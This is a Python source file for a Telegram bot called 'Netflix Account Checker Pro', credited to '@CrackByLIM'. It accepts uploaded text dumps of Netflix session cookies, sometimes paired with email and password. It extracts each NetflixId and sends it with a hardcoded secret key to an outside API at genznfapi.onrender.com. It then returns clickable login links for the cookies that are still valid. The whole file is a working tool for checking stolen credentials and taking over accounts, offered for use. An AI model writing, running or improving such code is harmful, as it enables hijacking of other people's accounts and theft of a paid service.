import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# Configuration
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== UNIVERSAL .TXT PARSER ====================
# This parser ONLY cares about finding NetflixId= in the text
# Everything else is optional - works with ANY format

def find_account_separator(content):
    """Automatically detect how accounts are separated in the .txt file"""
    # Common separators found in .txt files
    separators = [
        '----------------------------------------',
        '════════════════════════════════════════',
        '────────────────────────────────────────',
        '========================================',
        '++++++++++++++++++++++++++++++++++++++++',
        '---------------------------------------',
        '----------',
        '------',
        '\n\n\n',  # Multiple newlines
        '\r\n\r\n',
    ]
    
    for sep in separators:
        if sep in content:
            return sep
    
    # If no standard separator, try to detect by account headers
    lines = content.split('\n')
    account_headers = []
    
    header_patterns = [
        r'ACCOUNT #\d+',
        r'Account #\d+',
        r'PREMIUM ACCOUNT',
        r'Premium Account',
        r'Account \d+',
        r'#\d+',
    ]
    
    for i, line in enumerate(lines):
        for pattern in header_patterns:
            if re.search(pattern, line, re.IGNORECASE):
                account_headers.append(i)
                break
    
    if len(account_headers) > 1:
        return 'HEADER_BASED'
    
    return None

def extract_accounts_from_txt(content):
    """Extract individual accounts from .txt file content"""
    # First, try to find a separator
    separator = find_account_separator(content)
    
    accounts = []
    
    if separator and separator != 'HEADER_BASED':
        # Split by the detected separator
        raw_accounts = content.split(separator)
        accounts = [acc.strip() for acc in raw_accounts if acc.strip()]
        
    elif separator == 'HEADER_BASED':
        # Split based on account headers
        lines = content.split('\n')
        current_account = []
        
        for line in lines:
            # Check if this line starts a new account
            is_new_account = any([
                re.search(r'ACCOUNT #\d+', line, re.IGNORECASE),
                re.search(r'Account #\d+', line, re.IGNORECASE),
                re.search(r'PREMIUM ACCOUNT', line, re.IGNORECASE),
                re.search(r'Premium Account', line, re.IGNORECASE),
            ])
            
            if is_new_account and current_account:
                accounts.append('\n'.join(current_account))
                current_account = [line]
            elif is_new_account:
                current_account = [line]
            elif current_account:
                current_account.append(line)
            elif 'NetflixId=' in line and not current_account:
                # If we find a NetflixId without a header, start a new account
                current_account = [line]
        
        if current_account:
            accounts.append('\n'.join(current_account))
    
    else:
        # No clear separation, try to split by NetflixId occurrences
        # Each occurrence of NetflixId might indicate a new account
        parts = re.split(r'(?=NetflixId=)', content)
        accounts = [part.strip() for part in parts if 'NetflixId=' in part]
    
    # Filter out empty accounts
    accounts = [acc for acc in accounts if acc and len(acc) > 10]
    
    return accounts

def extract_netflix_id(text):
    """Extract NetflixId from ANY text - this is the ONLY essential part"""
    # Try multiple patterns to find NetflixId
    patterns = [
        r'NetflixId=([^&\s\'"]+)',  # Standard pattern
        r'NetflixId[=:]([^&\s\'"]+)',  # With colon instead of equals
        r'[Nn]etflix[Ii]d[=:]([^&\s\'"]+)',  # Case insensitive
        r'Cookie.*?NetflixId=([^&\s]+)',  # Inside Cookie field
        r'nftoken=([^&\s]+)',  # Sometimes in URL as nftoken
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            return match.group(1).strip()
    
    return None

def extract_email(text):
    """Extract email from ANY text if present"""
    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
    return match.group(1).strip() if match else None

def extract_field(text, field_names):
    """Extract a field by multiple possible names (supports multiple languages)"""
    for field_name in field_names:
        # Pattern: field_name: value or field_name = value
        pattern = rf'{re.escape(field_name)}[:\s=]+([^\n\r]+)'
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            return match.group(1).strip()
    return None

def parse_account_from_txt(account_text):
    """Parse a single account from .txt content - extracts NetflixId and any other info available"""
    try:
        account = {}
        
        # STEP 1: Extract NetflixId (MANDATORY - without this, account is invalid)
        netflix_id = extract_netflix_id(account_text)
        if not netflix_id:
            return None
        
        account['netflix_id'] = netflix_id
        logger.info(f"✅ Found NetflixId: {netflix_id[:30]}...")
        
        # STEP 2: Extract email if present (OPTIONAL)
        email = extract_email(account_text)
        if email:
            account['email'] = email
        else:
            account['email'] = f"user_{netflix_id[:8]}@unknown.com"
        
        # STEP 3: Extract other fields if present (OPTIONAL)
        # Name - supports multiple languages
        name = extract_field(account_text, ['Name', 'Nombre', 'Nome', '名前', '姓名', '이름', 'Имя'])
        if name:
            account['name'] = name
        
        # Country - supports multiple languages
        country = extract_field(account_text, ['Country', 'País', 'Pais', '国', '国家', '나라', 'Страна'])
        if country:
            account['country'] = country
        
        # Plan - supports multiple languages
        plan = extract_field(account_text, ['Plan', 'Plano', 'プラン', '套餐', '요금제', 'План'])
        if plan:
            account['plan'] = plan
        
        # Quality - supports multiple languages
        quality = extract_field(account_text, ['Video Quality', 'Qualidade', '画質', '视频质量', '화질', 'Качество'])
        if quality:
            account['quality'] = quality
        
        # Max Streams
        streams = extract_field(account_text, ['Max Streams', 'Máx. de streams', '同時視聴', '最大流', '최대 스트림', 'Макс. потоков'])
        if streams:
            account['max_streams'] = streams
        
        # Direct Login URL (if present in the text)
        url_match = re.search(r'(https?://[^\s]+nftoken=[^\s]+)', account_text)
        if url_match:
            account['direct_url'] = url_match.group(1).strip()
        
        return account
        
    except Exception as e:
        logger.error(f"Error parsing account: {e}")
        return None

# ==================== API FUNCTIONS ====================

async def check_netflix_id(netflix_id, email, account_data=None):
    """Check if Netflix ID is valid by calling the API"""
    
    # If account already has a direct URL from the file, use it without API call
    if account_data and account_data.get('direct_url'):
        logger.info(f"✅ Using pre-validated URL for {email}")
        return {
            "success": True,
            "login_url": account_data['direct_url'],
            "email": email,
            "data": {"pre_validated": True}
        }
    
    # If no netflix_id, can't check
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "email": email
        }
    
    # Otherwise, call the API as normal
    try:
        url = f"{API_URL}/api/gen"
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"Checking Netflix ID for {email}")
        
        response = requests.post(url, json=data, timeout=10)
        
        try:
            result = response.json()
        except:
            return {
                "success": False, 
                "error": "Invalid JSON response",
                "email": email
            }
        
        if result.get('success') == True:
            return {
                "success": True,
                "login_url": result.get('login_url'),
                "email": email,
                "data": result
            }
        else:
            return {
                "success": False,
                "error": result.get('error', 'Unknown error'),
                "error_code": result.get('error_code', 'UNKNOWN_ERROR'),
                "email": email
            }
                
    except Exception as e:
        return {
            "success": False, 
            "error": str(e),
            "email": email
        }

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with premium formatting"""
    user = update.effective_user
    
    welcome = f"""
╔════════════════════════════════════════╗
║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with Netflix accounts
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **Any .txt format works!** I'll automatically:
✅ Find Netflix cookies anywhere in the text
✅ Extract NetflixId= from any format
✅ Check validity with official API
✅ Send premium login links
✅ Show detailed statistics

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
╔════════════════════════════════════════╗
║           🆘 HELP CENTER 🆘            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • ANY format is accepted!
   • Write anything you want
   • Just make sure it contains `NetflixId=...`

2️⃣ **Send the .txt file to me**
   • I'll automatically find all Netflix cookies
   • Process each account
   • Only valid accounts will be sent

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **EXAMPLES OF ACCEPTED FORMATS:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✓ `email:password | NetflixCookies = NetflixId=...`
✓ `馃崻 Cookie: NetflixId=...` (emoji format)
✓ `NetflixId=v%3D3%26ct%3D...` (raw format)
✓ `Some random text... NetflixId=... more text`
✓ Multi-line accounts with any separators
✓ Any language (English, Spanish, Japanese, etc.)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/stats - Statistics
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔════════════════════════════════════════╗
║         📊 GLOBAL STATISTICS 📊        ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **Performance Metrics:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Total Checks:** `{total_checks}`
• **✅ Valid Accounts:** `{valid_accounts}`
• **❌ Invalid Accounts:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **System Status:**
• **Bot:** 🟢 ONLINE
• **API:** 🟢 CONNECTED

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║         ✅ SESSION CLEARED ✅          ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
You can now upload a new file.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )

# ==================== FILE HANDLER - ONLY .TXT FILES ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files - supports ANY content inside"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    # Check rate limit
    if not check_rate_limit(user_id):
        await update.message.reply_text(
            f"""
╔════════════════════════════════════════╗
║         ⏰ RATE LIMIT EXCEEDED         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Please wait a minute before trying again.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    document = update.message.document
    
    # ONLY accept .txt files
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"""
╔════════════════════════════════════════╗
║         ❌ INVALID FILE TYPE           ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Please upload a `.txt` file only.

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        return
    
    # Send initial message
    status_msg = await update.message.reply_text(
        f"""
╔════════════════════════════════════════╗
║        📥 FILE RECEIVED 📥             ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
⏳ **Status:** Downloading...

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """,
        parse_mode='Markdown'
    )
    
    try:
        # Download file
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Extract accounts from the .txt file (any format)
        accounts = extract_accounts_from_txt(content)
        
        if not accounts:
            await status_msg.edit_text(
                f"""
╔════════════════════════════════════════╗
║        ❌ NO ACCOUNTS FOUND ❌         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No Netflix cookies (NetflixId=) were found in your file.

💡 **Make sure your .txt file contains NetflixId=...**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """,
                parse_mode='Markdown'
            )
            return
        
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║         📊 ANALYZING FILE 📊           ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
📝 **Found:** `{len(accounts)}` potential accounts

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔄 **Extracting Netflix cookies...**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )
        
        # Process each account
        valid_count = 0
        invalid_count = 0
        valid_accounts_found = []
        
        for i, account_block in enumerate(accounts, 1):
            # Parse the account - extract NetflixId and any other info
            account = parse_account_from_txt(account_block)
            
            if not account:
                invalid_count += 1
                continue
            
            # Calculate progress
            progress = i / len(accounts)
            bar_length = 15
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Update progress
            if i % 1 == 0 or i == len(accounts):
                await status_msg.edit_text(
                    f"""
╔════════════════════════════════════════╗
║        🔄 PROCESSING ACCOUNTS 🔄       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **Progress:** `{i}/{len(accounts)}`
📈 **Complete:** `{progress*100:.1f}%`
`{bar}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Valid Found:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """,
                    parse_mode='Markdown'
                )
            
            # Check with API
            email = account.get('email', f"user_{account['netflix_id'][:8]}@unknown.com")
            result = await check_netflix_id(account['netflix_id'], email, account)
            
            # Update global stats
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Store valid account
                valid_accounts_found.append({
                    'email': email,
                    'login_url': result['login_url'],
                    'country': account.get('country', 'N/A'),
                    'plan': account.get('plan', 'N/A'),
                    'quality': account.get('quality', 'N/A'),
                    'streams': account.get('max_streams', 'N/A'),
                    'name': account.get('name', 'N/A'),
                    'direct_url': account.get('direct_url', None)
                })
            else:
                invalid_count += 1
                invalid_accounts += 1
            
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
        
        # COMPLETION SCREEN
        success_rate = valid_count/len(accounts)*100 if len(accounts) > 0 else 0
        
        completion_text = f"""
╔════════════════════════════════════════╗
║        ✅ PROCESSING COMPLETE ✅       ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 **RESULTS SUMMARY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **File:** `{document.file_name}`
📝 **Total Accounts:** `{len(accounts)}`
✅ **Valid Accounts:** `{valid_count}`
❌ **Invalid:** `{invalid_count}`
📈 **Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Sending {valid_count} valid account(s)...**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
        """
        
        await status_msg.edit_text(completion_text, parse_mode='Markdown')
        
        # Send ALL valid accounts
        if valid_accounts_found:
            for idx, acc in enumerate(valid_accounts_found, 1):
                # Build account details string
                details = []
                if acc.get('name') and acc['name'] != 'N/A':
                    details.append(f"• **Name:** `{acc['name']}`")
                if acc.get('country') and acc['country'] != 'N/A':
                    details.append(f"• **Country:** `{acc['country']}`")
                if acc.get('plan') and acc['plan'] != 'N/A':
                    details.append(f"• **Plan:** `{acc['plan']}`")
                if acc.get('quality') and acc['quality'] != 'N/A':
                    details.append(f"• **Quality:** `{acc['quality']}`")
                if acc.get('streams') and acc['streams'] != 'N/A':
                    details.append(f"• **Max Streams:** `{acc['streams']}`")
                
                details_str = '\n'.join(details) if details else '• No additional details found'
                
                premium_msg = f"""
╔════════════════════════════════════════╗
║     ✅ VALID ACCOUNT #{idx}/{valid_count} ✅     ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📧 **ACCOUNT DETAILS**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Email:** `{acc['email']}`
{details_str}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔗 **LOGIN LINK**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`{acc['login_url']}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *Link expires - use it now!*

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=acc['login_url'])]]
                
                await update.message.reply_text(
                    premium_msg,
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='Markdown'
                )
            
            # Final summary
            final_summary = f"""
╔════════════════════════════════════════╗
║        📬 ALL ACCOUNTS SENT 📬         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Successfully sent {valid_count} valid account(s)**

💡 **Check messages above for login links**

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """
            await update.message.reply_text(final_summary, parse_mode='Markdown')
            
        else:
            # No valid accounts found
            await update.message.reply_text(
                f"""
╔════════════════════════════════════════╗
║        ❌ NO VALID ACCOUNTS ❌         ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No valid accounts were found in your file.

💡 **Suggestions:**
• Make sure file contains valid NetflixId=
• Get fresh Netflix cookies
• Try again later

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """,
                parse_mode='Markdown'
            )
        
        # Store in session
        user_sessions[user_id] = {
            'last_file': document.file_name,
            'valid': valid_count,
            'invalid': invalid_count,
            'total': valid_count + invalid_count
        }
        
    except Exception as e:
        logger.error(f"Error processing file: {e}")
        await status_msg.edit_text(
            f"""
╔════════════════════════════════════════╗
║           ❌ ERROR ❌                  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 **File:** `{document.file_name}`
❌ **Error:** `{str(e)[:100]}`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💡 Please try again or check file format

⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """,
            parse_mode='Markdown'
        )

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 PROFESSIONAL NETFLIX ACCOUNT CHECKER")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ API URL: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("📝 Universal .txt Parser Enabled")
    print("✅ Only accepts .txt files")
    print("🌍 Works with ANY content inside")
    print("=" * 60)
    
    # Create application with custom settings
    app = (
        Application.builder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .write_timeout(30)
        .pool_timeout(30)
        .build()
    )
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    # Initialize and start
    try:
        await app.initialize()
        await app.start()
        await app.updater.start_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        print("✅ Bot started successfully!")
        print("=" * 60)
        print("🤖 Bot is now running! Waiting for .txt files...")
        print("=" * 60)
        
        while True:
            await asyncio.sleep(1)
            
    except Exception as e:
        print(f"❌ Error in bot: {e}")
        raise e
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")
        try:
            clear_telegram_webhook()
        except:
            pass

if __name__ == '__main__':
    main()
